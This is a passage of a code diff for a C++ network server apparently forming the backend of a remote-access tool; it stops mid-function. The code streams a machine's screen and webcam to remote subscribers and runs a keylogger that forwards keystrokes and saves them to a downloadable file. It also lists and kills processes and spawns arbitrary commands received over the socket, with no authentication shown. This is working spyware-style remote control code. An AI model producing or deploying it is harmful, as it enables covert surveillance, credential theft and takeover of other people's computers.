@@ -13,18 +13,89 @@
 #include <sys/types.h>
 #include <unistd.h>
 #include <fstream>
+#include <sys/ioctl.h>     // For TIOCOUTQ
+#include <linux/sockios.h> // For waiting buffer
 
 #include <chrono>
 #include <iostream>
 #include <sstream>
+#include <atomic>
+#include <thread>
+#include <memory>
+#include <vector>
+#include <algorithm> // for transform
+#include <mutex>
+#include <functional>
+#include <unordered_map>
 
 #include "api/monitor.hpp"
 #include "api/process.hpp"
 #include "api/webcam.hpp"
 #include "api/keylogger.hpp"
+#include "api/application.hpp"
+
+// ==========================================
+// Global Hardware State (Single Instance Resource)
+// ==========================================
+namespace {
+    // Application Manager (Shared)
+    static ApplicationManager g_app_manager;
+
+    // --- STREAMING INFRASTRUCTURE ---
+    using PacketCallback = std::function<bool(const std::vector<uint8_t>&)>;
+    struct Subscriber {
+        uint32_t id;
+        PacketCallback send_fn;
+    };
+
+    // Monitor State
+    std::atomic<bool> g_screen_streaming{false};       // Thread Control
+    std::mutex g_screen_mutex;                         // Protects subs & header
+    std::vector<Subscriber> g_screen_subs;             // Active subscribers
+    std::vector<uint8_t> g_screen_header_cache;        // SPS/PPS Cache
+
+    // Webcam State
+    std::atomic<bool> g_webcam_streaming{false};      // Thread Control
+    std::mutex g_webcam_mutex;                        // Protects subs & header
+    std::vector<Subscriber> g_webcam_subs;            // Active subscribers
+    std::vector<uint8_t> g_webcam_header_cache;       // SPS/PPS Cache
+    int g_webcam_index = 0;
+
+    // Keylogger State
+    std::atomic<bool> g_keylog_active{false};
+    std::unique_ptr<Keylogger> g_keylogger;
+    std::mutex g_keylog_mutex;
+
+    // Helpers
+    int to_int(const std::string& str, int def_val = 0) {
+        try { return std::stoi(str); } catch (...) { return def_val; }
+    }
+
+    std::vector<std::string> split_ws(const std::string& s) {
+        std::istringstream iss(s);
+        std::vector<std::string> out;
+        for (std::string tok; iss >> tok;) out.push_back(tok);
+        return out;
+    }
+
+    void make_dummy_jpeg(std::vector<uint8_t>& out, int size) {
+        out.resize(size);
+        for (int i = 0; i < size; ++i) out[i] = static_cast<uint8_t>(i % 256);
+    }
+
+    // Congestion Control Helper
+    [[maybe_unused]] static size_t get_socket_pending(int fd) {
+        int pending = 0;
+        if (ioctl(fd, TIOCOUTQ, &pending) < 0) return 0;
+        return (size_t)pending;
+    }
+}
 
 static const size_t BUFF_SIZE = 8 * 1024 * 1024;
 static const int BACKEND_HEADER_SIZE = 12;
+// 1MB Threshold for dropping frames.
+// If OS buffer has >1MB pending, we skip sending video to let it drain.
+static const size_t CONGESTION_THRESHOLD = 1 * 1024 * 1024;
 
 static int set_socket_opts(int fd) {
     int flag = 1;
@@ -74,7 +145,6 @@ void BackendServer::run() {
     running_.store(true);
     std::cout << "[BackendServer] Listening on port " << port_ << std::endl;
 
-    // Accept loop in this thread
     acceptLoop();
 }
 
@@ -103,24 +173,17 @@ void BackendServer::acceptLoop() {
         set_socket_opts(fd);
         std::cout << "[BackendServer] New connection from " << inet_ntoa(peer.sin_addr) << ":" << ntohs(peer.sin_port) << " fd=" << fd << std::endl;
 
-        // Handle client in detached thread
         std::thread t(&BackendServer::handleClient, this, fd);
         t.detach();
     }
 }
 
 bool BackendServer::readFrame(int fd, std::vector<uint8_t>& payload, uint32_t& client_id, uint32_t& backend_id) {
-    // Read 12-byte header first
     uint8_t header[BACKEND_HEADER_SIZE];
     size_t got = 0;
     while (got < BACKEND_HEADER_SIZE) {
         ssize_t n = recv(fd, header + got, BACKEND_HEADER_SIZE - got, 0);
-        if (n <= 0) {
-            if (n == 0) return false; // closed
-            if (errno == EINTR) continue;
-            perror("recv header");
-            return false;
-        }
+        if (n <= 0) return false;
         got += n;
     }
 
@@ -142,12 +205,7 @@ bool BackendServer::readFrame(int fd, std::vector<uint8_t>& payload, uint32_t& c
     size_t rcv = 0;
     while (rcv < len) {
         ssize_t n = recv(fd, payload.data() + rcv, len - rcv, 0);
-        if (n <= 0) {
-            if (n == 0) return false;
-            if (errno == EINTR) continue;
-            perror("recv payload");
-            return false;
-        }
+        if (n <= 0) return false;
         rcv += n;
     }
 
@@ -159,81 +217,38 @@ bool BackendServer::sendFrame(int fd, const uint8_t* payload, uint32_t payload_l
     uint32_t net_client = htonl(client_id);
     uint32_t net_backend = htonl(backend_id);
 
-    // send header
     uint8_t header[BACKEND_HEADER_SIZE];
     memcpy(header, &net_len, 4);
     memcpy(header + 4, &net_client, 4);
     memcpy(header + 8, &net_backend, 4);
 
-    // send all header
+    // Send header
     size_t sent = 0;
     while (sent < BACKEND_HEADER_SIZE) {
         ssize_t n = send(fd, header + sent, BACKEND_HEADER_SIZE - sent, 0);
-        if (n <= 0) {
-            if (n == 0) return false;
-            if (errno == EINTR) continue;
-            perror("send header-");
-            return false;
-        }
+        if (n <= 0) return false;
         sent += n;
     }
 
-    // send payload
+    // Send payload
     sent = 0;
     while (sent < payload_len) {
         ssize_t n = send(fd, payload + sent, payload_len - sent, 0);
-        if (n <= 0) {
-            if (n == 0) return false;
-            if (errno == EINTR) continue;
-            perror("send payload");
-            return false;
-        }
+        if (n <= 0) return false;
         sent += n;
     }
-
     return true;
 }
 
-static void make_dummy_jpeg(std::vector<uint8_t>& out, int size) {
-    out.resize(size);
-    for (int i = 0; i < size; ++i) out[i] = static_cast<uint8_t>(i % 256);
+void BackendServer::streamingThread(int, uint32_t, uint32_t, std::atomic_bool*) {
+    // Legacy placeholder
 }
-
-void BackendServer::streamingThread(int fd, uint32_t client_id, uint32_t backend_id, std::atomic_bool* running) {
-    const int FPS = 15;
-    const useconds_t interval = 1000000 / FPS;
-    std::vector<uint8_t> jpeg;
-    int count = 0;
-
-    while (running->load()) {
-        // Capture screen frame via Monitor API. Fallback to dummy jpeg when capture fails.
-        static Monitor monitor;
-        jpeg = monitor.capture_frame();
-        if (jpeg.empty()) {
-            make_dummy_jpeg(jpeg, 1024 + (count % 100));
-        }
-
-        if (!sendFrame(fd, jpeg.data(), (uint32_t)jpeg.size(), client_id, backend_id)) {
-            std::cerr << "[BackendServer] failed to send frame during streaming" << std::endl;
-            break;
-        }
-        ++count;
-        if (count % 30 == 0) std::cout << "[BackendServer] streamed " << count << " frames\n";
-        usleep(interval);
-    }
-
-    std::cout << "[BackendServer] streaming stopped" << std::endl;
-}
-
-
 
 void BackendServer::handleClient(int fd) {
     std::vector<uint8_t> payload;
     uint32_t client_id = 0, backend_id = 0;
 
-    std::atomic_bool alive(true);
-
-    // per-connection send lock: tránh interleave header/payload giữa threads
+    // Send Mutex
     std::mutex send_mu;
     auto send_text = [&](const std::string& s, uint32_t cid, uint32_t bid) -> bool {
         std::lock_guard<std::mutex> lk(send_mu);
@@ -244,375 +259,354 @@ void BackendServer::handleClient(int fd) {
         return sendFrame(fd, b.data(), (uint32_t)b.size(), cid, bid);
     };
 
-    // screen streaming
-    std::atomic_bool screen_streaming(false);
-    std::thread screen_thread;
-
-    // webcam streaming
-    std::atomic_bool webcam_streaming(false);
-    std::thread webcam_thread;
-    std::unique_ptr<Webcam> webcam_cam;
-    int webcam_index = 0;
-
-    auto stop_screen = [&]() {
-        screen_streaming.store(false);
-        if (screen_thread.joinable()) screen_thread.join();
-    };
-    auto stop_webcam = [&]() {
-        webcam_streaming.store(false);
-        if (webcam_thread.joinable()) webcam_thread.join();
-        if (webcam_cam) { webcam_cam->close(); webcam_cam.reset(); }
-    };
-
-    // Recording State
-    std::atomic<bool> screen_recording(false);
-    std::atomic<bool> webcam_recording(false);
-    std::ofstream screen_rec_file;
-    std::ofstream webcam_rec_file;
-    std::mutex rec_mu;
-
     auto send_file = [&](const std::string& path, const std::string& filename, uint32_t cid, uint32_t bid) {
         std::ifstream f(path, std::ios::binary | std::ios::ate);
         if (!f) return;
         std::streamsize size = f.tellg();
         f.seekg(0, std::ios::beg);
-
         std::vector<uint8_t> buffer(size);
         if (f.read((char*)buffer.data(), size)) {
-            // Protocol: [0x03] [4B name len] [Name] [Content]
-            std::vector<uint8_t> packet;
-            uint32_t name_len = filename.length();
-            uint32_t net_name_len = htonl(name_len);
-
-            packet.push_back(0x03); // FILE_DOWNLOAD
-            packet.resize(1 + 4 + name_len + size);
-
-            memcpy(packet.data() + 1, &net_name_len, 4);
-            memcpy(packet.data() + 5, filename.data(), name_len);
-            memcpy(packet.data() + 5 + name_len, buffer.data(), size);
-
-            send_bytes(packet, cid, bid);
-            send_text("OK: Sent file " + filename, cid, bid);
+             uint32_t name_len = filename.length();
+             uint32_t net_name_len = htonl(name_len);
+             std::vector<uint8_t> packet;
+             packet.push_back(0x03);
+             packet.resize(1 + 4 + name_len + size);
+             memcpy(packet.data() + 1, &net_name_len, 4);
+             memcpy(packet.data() + 5, filename.data(), name_len);
+             memcpy(packet.data() + 5 + name_len, buffer.data(), size);
+             send_bytes(packet, cid, bid);
+             send_text("OK: Sent file " + filename, cid, bid);
         }
     };
 
-    auto split_ws = [](const std::string& s) {
-        std::istringstream iss(s);
-        std::vector<std::string> out;
-        for (std::string tok; iss >> tok;) out.push_back(tok);
-        return out;
-    };
-    auto to_int = [](const std::string& s, int def) {
-        try { return std::stoi(s); } catch (...) { return def; }
-    };
+    // Handlers Map
+    std::unordered_map<std::string, std::function<void(const std::vector<std::string>&, uint32_t, uint32_t)>> handlers;
 
-    using H = std::function<void(const std::vector<std::string>&, uint32_t, uint32_t)>;
-    std::unordered_map<std::string, H> handlers;
+    // --- Monitor Handlers ---
+    handlers["start_monitor_stream"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
+        std::lock_guard<std::mutex> lk(g_screen_mutex);
 
-    handlers["record_screen_10s"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        if (screen_recording.exchange(true)) return (void)send_text("ERROR: Already recording screen", cid, bid);
+        // 1. Register Subscriber
+        PacketCallback cb = [send_bytes, cid, bid](const std::vector<uint8_t>& data) {
+            return send_bytes(data, cid, bid);
+        };
+        g_screen_subs.push_back({cid, cb});
+        send_text("STATUS:MONITOR_STREAM:STARTED", cid, bid);
 
-        {
-            std::lock_guard<std::mutex> lk(rec_mu);
-            screen_rec_file.open("screen.h264", std::ios::binary);
+        // 2. Smart Join: Send Cached Header if available
+        if (!g_screen_header_cache.empty()) {
+            std::vector<uint8_t> header_pkt;
+            header_pkt.push_back(0x01); // MONITOR_STREAM
+            header_pkt.insert(header_pkt.end(), g_screen_header_cache.begin(), g_screen_header_cache.end());
+            send_bytes(header_pkt, cid, bid);
+            // std::cout << "[Backend] Sent cached header to CID " << cid << std::endl;
         }
-        send_text("OK: Screen recording started (10s)", cid, bid);
 
-        std::thread([&, cid, bid]() {
-            std::this_thread::sleep_for(std::chrono::seconds(10));
-            screen_recording.store(false);
-            {
-                std::lock_guard<std::mutex> lk(rec_mu);
-                if (screen_rec_file.is_open()) screen_rec_file.close();
-            }
+        // 3. Start Global Streaming Thread if not running
+        if (!g_screen_streaming) {
+             g_screen_streaming = true;
+             std::thread([&]() {
+                Monitor monitor;
+                // int drop_count = 0; // Unused for now
 
-            // Convert to MP4
-            std::cout << "[Server] Converting screen.h264 to mp4..." << std::endl;
-            int ret = system("ffmpeg -y -r 30 -i screen.h264 -c:v copy screen.mp4 > /dev/null 2>&1");
+                monitor.stream_h264([&](const std::vector<uint8_t>& chunk) -> bool {
+                    std::lock_guard<std::mutex> lk_subs(g_screen_mutex);
+                    if (!g_screen_streaming) return false;
 
-            if (ret == 0) {
-                 send_file("screen.mp4", "screen_clip.mp4", cid, bid);
-            } else {
-                 std::cerr << "[Server] FFmpeg conversion failed." << std::endl;
-                 send_text("ERROR: Recording conversion failed", cid, bid);
-            }
-        }).detach();
-    };
+                    // HEADER CACHING Strategy:
+                    // First few chunks usually contain SPS/PPS/IDR.
+                    // We simply cache the first 4KB or wait for IDR?
+                    // Simple logic: If cache empty, appending first chunks.
+                    if (g_screen_header_cache.size() < 4096) {
+                        g_screen_header_cache.insert(g_screen_header_cache.end(), chunk.begin(), chunk.end());
+                    }
 
-    handlers["record_webcam_10s"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        if (webcam_recording.exchange(true)) return (void)send_text("ERROR: Already recording webcam", cid, bid);
+                    // Prepare Packet
+                    std::vector<uint8_t> packet;
+                    packet.push_back(0x01);
+                    packet.insert(packet.end(), chunk.begin(), chunk.end());
 
-        {
-            std::lock_guard<std::mutex> lk(rec_mu);
-            webcam_rec_file.open("webcam.h264", std::ios::binary);
-        }
-        send_text("OK: Webcam recording started (10s)", cid, bid);
+                    // Broadcast to all subscribers
+                    for (auto it = g_screen_subs.begin(); it != g_screen_subs.end(); ) {
+                        if (!it->send_fn(packet)) {
+                            // Socket Error -> Remove Subscriber
+                            // std::cout << "[Backend] Subscriber CID " << it->id << " disconnected." << std::endl;
+                            it = g_screen_subs.erase(it);
+                        } else {
+                            ++it;
+                        }
+                    }
 
-        std::thread([&, cid, bid]() {
-            std::this_thread::sleep_for(std::chrono::seconds(10));
-            webcam_recording.store(false);
-            {
-                std::lock_guard<std::mutex> lk(rec_mu);
-                if (webcam_rec_file.is_open()) webcam_rec_file.close();
-            }
+                    // Auto-Stop if no subscribers left?
+                    if (g_screen_subs.empty()) {
+                         // std::cout << "[Backend] No subscribers. Stopping Monitor Stream." << std::endl;
+                         g_screen_streaming = false;
+                         g_screen_header_cache.clear();
+                         return false; // Stop Encoder
+                    }
 
-            // Convert to MP4
-            std::cout << "[Server] Converting webcam.h264 to mp4..." << std::endl;
-            int ret = system("ffmpeg -y -r 30 -i webcam.h264 -c:v copy webcam.mp4 > /dev/null 2>&1");
+                    return true;
+                });
 
-            if (ret == 0) {
-                send_file("webcam.mp4", "webcam_clip.mp4", cid, bid);
-            } else {
-                std::cerr << "[Server] FFmpeg conversion failed." << std::endl;
-                send_text("ERROR: Recording conversion failed", cid, bid);
-            }
-        }).detach();
-    };
-
-    handlers["start_monitor_stream"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        if (screen_streaming.exchange(true)) return (void)send_text("ERROR: Already streaming", cid, bid);
-
-        // Stop webcam if active
-        if (webcam_streaming.load()) stop_webcam();
-
-        send_text("OK: Streaming started", cid, bid);
-
-        stop_screen();                 // ensure no previous thread
-        screen_streaming.store(true);
-
-    screen_thread = std::thread([&, cid, bid]() {
-            Monitor monitor;
-
-            // Continuous H.264 Stream (using FFmpeg pipe)
-            // Blocks here until callback returns false or stream ends
-            monitor.stream_h264([&](const std::vector<uint8_t>& chunk) {
-                if (!alive.load() || !screen_streaming.load()) return false; // Stop stream
-
-                // Recording Hook
-                if (screen_recording.load()) {
-                    std::lock_guard<std::mutex> lk(rec_mu);
-                    if (screen_rec_file.is_open()) screen_rec_file.write((const char*)chunk.data(), chunk.size());
+                // Thread Exit Cleanup
+                {
+                    std::lock_guard<std::mutex> lk_subs(g_screen_mutex);
+                    g_screen_streaming = false;
+                    g_screen_header_cache.clear();
+                    // Notify any remaining subs? No need.
                 }
-
-                // Multiplexing: Prepend 0x01 (SCREEN_STREAM)
-                std::vector<uint8_t> packet;
-                packet.reserve(1 + chunk.size());
-                packet.push_back(0x01);
-                packet.insert(packet.end(), chunk.begin(), chunk.end());
-
-                return send_bytes(packet, cid, bid);
-            });
-
-            screen_streaming.store(false);
-            send_text("INFO: Streaming stopped", cid, bid);
-        });
+             }).detach();
+        }
     };
 
-    handlers["stop_monitor_stream"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        if (!screen_streaming.load()) return (void)send_text("ERROR: Not streaming", cid, bid);
-        stop_screen();
-        send_text("OK: Streaming stopped", cid, bid);
+    handlers["stop_monitor_stream"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
+        (void)cid; (void)bid;
+        std::lock_guard<std::mutex> lk(g_screen_mutex);
+
+        // Broadcast STOP to all
+        std::string msg = "STATUS:MONITOR_STREAM:STOPPED";
+        std::vector<uint8_t> pkt(msg.begin(), msg.end());
+        for(auto& sub : g_screen_subs) {
+            sub.send_fn(pkt);
+        }
+
+        // GLOBAL STOP
+        g_screen_streaming = false;
+        g_screen_subs.clear();
+        g_screen_header_cache.clear();
     };
 
-    handlers["frame_capture"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        Monitor monitor;
-        auto jpeg = monitor.capture_frame();
+    handlers["frame_capture"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
+        Monitor m;
+        auto jpeg = m.capture_frame();
         if (jpeg.empty()) make_dummy_jpeg(jpeg, 2048);
         send_bytes(jpeg, cid, bid);
     };
 
-    handlers["webcam_capture"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
-        int idx = (a.size() >= 2) ? to_int(a[1], webcam_index) : webcam_index;
-        int w=0,h=0;
-        auto jpeg = capture_webcam_frame(idx, w, h);
-        if (jpeg.empty()) {
-            Monitor m;
-            jpeg = m.capture_frame();
-            if (jpeg.empty()) make_dummy_jpeg(jpeg, 2048);
+
+    // --- Webcam Handlers ---
+    handlers["start_webcam_stream"] = [&](const std::vector<std::string>& a, uint32_t cid, uint32_t bid) {
+        std::lock_guard<std::mutex> lk(g_webcam_mutex);
+
+        // 1. Register Subscriber
+        PacketCallback cb = [send_bytes, cid, bid](const std::vector<uint8_t>& data) {
+            return send_bytes(data, cid, bid);
+        };
+        g_webcam_subs.push_back({cid, cb});
+
+        int idx = (a.size() >= 2) ? to_int(a[1], 0) : 0;
+        g_webcam_index = idx;
+
+        send_text("STATUS:WEBCAM_STREAM:STARTED", cid, bid);
+
+        // 2. Smart Join: Send Cached Header
+        if (!g_webcam_header_cache.empty()) {
+            std::vector<uint8_t> header_pkt;
+            header_pkt.push_back(0x02); // WEBCAM_STREAM
+            header_pkt.insert(header_pkt.end(), g_webcam_header_cache.begin(), g_webcam_header_cache.end());
+            send_bytes(header_pkt, cid, bid);
         }
-        send_bytes(jpeg, cid, bid);
-    };
 
-    handlers["start_webcam_stream"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
-        if (webcam_streaming.exchange(true)) return (void)send_text("ERROR: Webcam already streaming", cid, bid);
+        // 3. Start Global Streaming Thread
+        if (!g_webcam_streaming) {
+             g_webcam_streaming = true;
+             std::thread([&]() {
+                Webcam cam(g_webcam_index);
+                // int drop_count = 0;
 
-        // Allow simultaneous streams now that we have multiplexing
-        // if (screen_streaming.load()) stop_screen();
+                cam.stream_h264([&](const std::vector<uint8_t>& chunk) -> bool {
+                    std::lock_guard<std::mutex> lk_subs(g_webcam_mutex);
+                    if (!g_webcam_streaming) return false;
 
-        int idx = (a.size() >= 2) ? to_int(a[1], webcam_index) : webcam_index;
-        webcam_index = idx;
+                    // HEADER CACHING
+                    if (g_webcam_header_cache.size() < 4096) {
+                        g_webcam_header_cache.insert(g_webcam_header_cache.end(), chunk.begin(), chunk.end());
+                    }
 
-        stop_webcam();
+                    // Prepare Packet
+                    std::vector<uint8_t> packet;
+                    packet.push_back(0x02); // WEBCAM_STREAM
+                    packet.insert(packet.end(), chunk.begin(), chunk.end());
 
-        // Ensure device availability logic...
+                    // Broadcast
+                    for (auto it = g_webcam_subs.begin(); it != g_webcam_subs.end(); ) {
+                        if (!it->send_fn(packet)) {
+                            it = g_webcam_subs.erase(it);
+                        } else {
+                            ++it;
+                        }
+                    }
 
-        send_text("OK: Webcam streaming started", cid, bid);
-        webcam_streaming.store(true);
+                    if (g_webcam_subs.empty()) {
+                         g_webcam_streaming = false;
+                         g_webcam_header_cache.clear();
+                         return false;
+                    }
+                    return true;
+                });
 
-        webcam_thread = std::thread([&, cid, bid]() {
-            if (!webcam_cam) webcam_cam = std::make_unique<Webcam>(webcam_index);
-
-            webcam_cam->stream_h264([&](const std::vector<uint8_t>& chunk) {
-                if (!alive.load() || !webcam_streaming.load()) return false;
-
-                // Recording Hook
-                if (webcam_recording.load()) {
-                    std::lock_guard<std::mutex> lk(rec_mu);
-                    if (webcam_rec_file.is_open()) webcam_rec_file.write((const char*)chunk.data(), chunk.size());
+                // Cleanup
+                {
+                    std::lock_guard<std::mutex> lk_subs(g_webcam_mutex);
+                    g_webcam_streaming = false;
+                    g_webcam_header_cache.clear();
                 }
-
-                // Multiplexing: Prepend 0x02 (WEBCAM_STREAM)
-                std::vector<uint8_t> packet;
-                packet.reserve(1 + chunk.size());
-                packet.push_back(0x02);
-                packet.insert(packet.end(), chunk.begin(), chunk.end());
-
-                return send_bytes(packet, cid, bid);
-            });
-
-            webcam_streaming.store(false);
-            send_text("INFO: Webcam stopped", cid, bid);
-        });
-    };
-
-    handlers["stop_webcam_stream"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        if (!webcam_streaming.load()) return (void)send_text("ERROR: Webcam not streaming", cid, bid);
-        stop_webcam();
-        send_text("OK: Webcam streaming stopped", cid, bid);
-    };
-
-    handlers["list_process"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        std::cout << "[Server] Received list_process command" << std::endl;
-        std::ostringstream oss;
-        Process::print_all(oss);
-        auto out = oss.str();
-        std::cout << "[Server] Process list generated. Size: " << out.size() << " bytes" << std::endl;
-
-        if (out.empty()) {
-            std::cerr << "[Server] ERROR: Process list is empty!" << std::endl;
-            send_text("ERROR: Failed to list processes", cid, bid);
-        }
-        else {
-            send_text(out, cid, bid);
+             }).detach();
         }
     };
 
-    handlers["ping"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        char hostname[1024];
-        if (gethostname(hostname, sizeof(hostname)) == 0) {
-             send_text("INFO: NAME=" + std::string(hostname), cid, bid);
-        } else {
-             send_text("INFO: NAME=Unknown-Host", cid, bid);
+    handlers["stop_webcam_stream"] = [&](const std::vector<std::string>&, uint32_t cid, uint32_t bid) {
+        (void)cid; (void)bid;
+        std::lock_guard<std::mutex> lk(g_webcam_mutex);
+
+        // Broadcast STOP to all
+        std::string msg = "STATUS:WEBCAM_STREAM:STOPPED";
+        std::vector<uint8_t> pkt(msg.begin(), msg.end());
+        for(auto& sub : g_webcam_subs) {
+            sub.send_fn(pkt);
         }
-    };
-    handlers["shutdown"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        send_text("OK: Shutting down server...", cid, bid);
-        std::thread([&]() {
-            std::this_thread::sleep_for(std::chrono::seconds(1));
-            std::cout << "[Server] Executing poweroff..." << std::endl;
-            if (system("poweroff") != 0) {
-                std::cerr << "[Server] ERROR: Failed to execute poweroff (sudo required?)" << std::endl;
-            }
-        }).detach();
+
+        // GLOBAL STOP
+        g_webcam_streaming = false;
+        g_webcam_subs.clear();
+        g_webcam_header_cache.clear();
     };
 
-    handlers["restart"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        send_text("OK: Restarting server...", cid, bid);
-        std::thread([&]() {
-            std::this_thread::sleep_for(std::chrono::seconds(1));
-            std::cout << "[Server] Executing reboot..." << std::endl;
-            if (system("reboot") != 0) {
-                std::cerr << "[Server] ERROR: Failed to execute reboot (sudo required?)" << std::endl;
-            }
-        }).detach();
-    };
 
-    handlers["kill_process"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
-        if (a.size() < 2) return (void)send_text("ERROR: Missing PID", cid, bid);
-        int pid = to_int(a[1], -1);
-        if (pid <= 0) return (void)send_text("ERROR: Invalid PID", cid, bid);
-
-        Process p(pid);
-        int res = p.destroy();
-        if (res == 0) {
-            std::cout << "[Server] Successfully killed PID " << pid << std::endl;
-            send_text("OK: Process killed " + std::to_string(pid), cid, bid);
-        } else {
-            std::string err = strerror(errno);
-            std::cerr << "[Server] Failed to kill PID " << pid << ": " << err << std::endl;
-            send_text("ERROR: Failed to kill " + std::to_string(pid) + ": " + err, cid, bid);
-        }
-    };
-
-    // Keylogger State
-    std::unique_ptr<Keylogger> keylogger;
-    std::thread keylog_thread;
-    std::atomic<bool> keylog_active(false);
-
+    // --- Keylogger Handlers ---
     handlers["start_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        std::cout << "[Server] Received start_keylog command from Client " << cid << std::endl;
+        std::lock_guard<std::mutex> lk(g_keylog_mutex);
+        if (g_keylog_active.load()) return (void)send_text("ERROR:KEYLOG:ALREADY_ACTIVE", cid, bid);
 
-        if (keylog_active.load()) return (void)send_text("ERROR: Keylogger already running", cid, bid);
+        if (!g_keylogger) g_keylogger = std::make_unique<Keylogger>();
 
-        if (!keylogger) keylogger = std::make_unique<Keylogger>();
-
-        // Start with callback that sends text immediately AND writes to file
-        bool started = keylogger->start([&, cid, bid](std::string key) {
-             send_text("KEYLOG: " + key, cid, bid);
-
-             // Append to keylog.txt
-             std::ofstream logfile("keylog.txt", std::ios::app);
-             if (logfile.is_open()) {
-                 logfile << key;
-                 // Flush sometimes? std::endl flushes but we append string.
-                 // For now relying on close or auto flush.
-             }
+        // Start returns bool
+        bool ok = g_keylogger->start([&, cid, bid](std::string keys) {
+            send_text("KEYLOG: " + keys, cid, bid);
+            // Simple file log
+            static std::ofstream f("keylog.txt", std::ios::app);
+            if(f.is_open()) f << keys << std::flush;
         });
 
-        if (!started) {
-            std::cerr << "[Server] Failed to start keylogger: " << keylogger->get_last_error() << std::endl;
-            send_text("ERROR: Failed to start keylogger: " + keylogger->get_last_error(), cid, bid);
-            return;
+        if (ok) {
+            g_keylog_active.store(true);
+            send_text("STATUS:KEYLOGGER:STARTED", cid, bid);
+        } else {
+            send_text("ERROR:KEYLOGGER:START_FAILED:" + g_keylogger->get_last_error(), cid, bid);
         }
-
-        keylog_active.store(true);
-        send_text("OK: Keylogger started", cid, bid);
     };
 
     handlers["stop_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        if (!keylog_active.load()) return (void)send_text("ERROR: Keylogger not running", cid, bid);
-        if (keylogger) keylogger->stop();
-        keylog_active.store(false);
-        send_text("OK: Keylogger stopped", cid, bid);
+        std::lock_guard<std::mutex> lk(g_keylog_mutex);
+        if (g_keylog_active.load() && g_keylogger) {
+            g_keylogger->stop();
+            g_keylog_active.store(false);
+            send_text("STATUS:KEYLOGGER:STOPPED", cid, bid);
+        } else {
+            send_text("ERROR:KEYLOGGER:NOT_ACTIVE", cid, bid);
+        }
     };
 
     handlers["get_keylog"] = [&](const auto&, uint32_t cid, uint32_t bid) {
-        send_file("keylog.txt", "full_keylog.txt", cid, bid);
+        send_file("keylog.txt", "keylog_dump.txt", cid, bid);
     };
 
+
+    // --- Process & App Handlers ---
+    handlers["list_process"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        std::ostringstream oss;
+        Process::print_all(oss);
+        send_text(oss.str(), cid, bid);
+    };
+
+    handlers["kill_process"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
+        if(a.size() < 2) return;
+        Process p(to_int(a[1]));
+        if(p.destroy() == 0) send_text("OK: Killed " + a[1], cid, bid);
+        else send_text("ERROR: Kill failed", cid, bid);
+    };
+
+    handlers["start_process"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
+        if(a.size() < 2) return;
+        std::string cmd;
+        for(size_t i=1; i<a.size(); ++i) { if(i>1) cmd+=" "; cmd+=a[i]; }
+
+        // Smart Launch Logic
+        auto matches = g_app_manager.search_apps(cmd);
+        if(!matches.empty()) {
+            int pid = g_app_manager.start_app(matches[0].id);
+            if(pid > 0) return (void)send_text("OK: Smart Launch " + matches[0].name, cid, bid);
+        }
+
+        int pid = Process::spawn(cmd);
+        if(pid > 0) send_text("OK: Spawned PID " + std::to_string(pid), cid, bid);
+        else send_text("ERROR: Spawn failed", cid, bid);
+    };
+
+    handlers["list_apps"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        auto apps = g_app_manager.get_all_apps();
+        std::string payload = "DATA:APPS:";
+        for(size_t i=0; i<apps.size(); ++i) {
+            if(i>0) payload += ";";
+            payload += apps[i].id + "|" + apps[i].name + "|" + apps[i].icon + "|" + apps[i].exec + "|" + apps[i].keywords;
+        }
+        send_text(payload, cid, bid);
+    };
+
+    handlers["search_apps"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
+        std::string q;
+        for(size_t i=1; i<a.size(); ++i) { if(i>1) q+=" "; q+=a[i]; }
+        auto apps = g_app_manager.search_apps(q);
+        std::string payload = "DATA:APPS:";
+        for(size_t i=0; i<apps.size() && i<50; ++i) {
+            if(i>0) payload += ";";
+            payload += apps[i].id + "|" + apps[i].name + "|" + apps[i].icon + "|" + apps[i].exec + "|" + apps[i].keywords;
+        }
+        send_text(payload, cid, bid);
+    };
+
+    handlers["start_app"] = [&](const auto& a, uint32_t cid, uint32_t bid) {
+        if(a.size()<2) return;
+        int pid = g_app_manager.start_app(a[1]);
+        if(pid>0) send_text("OK: App PID " + std::to_string(pid), cid, bid);
+        else send_text("ERROR: Start App Failed", cid, bid);
+    };
+
+    // System Handlers
+    handlers["ping"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+        char h[256]; gethostname(h, 256);
+        send_text("INFO: NAME=" + std::string(h), cid, bid);
+    };
+    handlers["get_state"] = [&](const auto&, uint32_t cid, uint32_t bid) {
+         if(g_screen_streaming) send_text("STATUS:SYNC:monitor=active", cid, bid);
+         if(g_webcam_streaming) send_text("STATUS:SYNC:webcam=active", cid, bid);
+         if(g_keylog_active) send_text("STATUS:SYNC:keylogger=active", cid, bid);
+         send_text("STATUS:SYNC:complete", cid, bid);
+    };
+
+
+    // Main Loop
     while (running_.load()) {
         payload.clear();
         if (!readFrame(fd, payload, client_id, backend_id)) break;
 
-        std::string cmd;
-        if (!payload.empty()) cmd.assign((char*)payload.data(), payload.size());
-        auto z = cmd.find('\0');
-        if (z != std::string::npos) cmd.resize(z);
+        std::string msg;
+        if (!payload.empty()) msg.assign((char*)payload.data(), payload.size());
+        // trim nulls
+        size_t z = msg.find('\0');
+        if (z != std::string::npos) msg.resize(z);
 
-        auto parts = split_ws(cmd);
+        auto parts = split_ws(msg);
         if (parts.empty()) continue;
 
         auto it = handlers.find(parts[0]);
-        if (it == handlers.end()) {
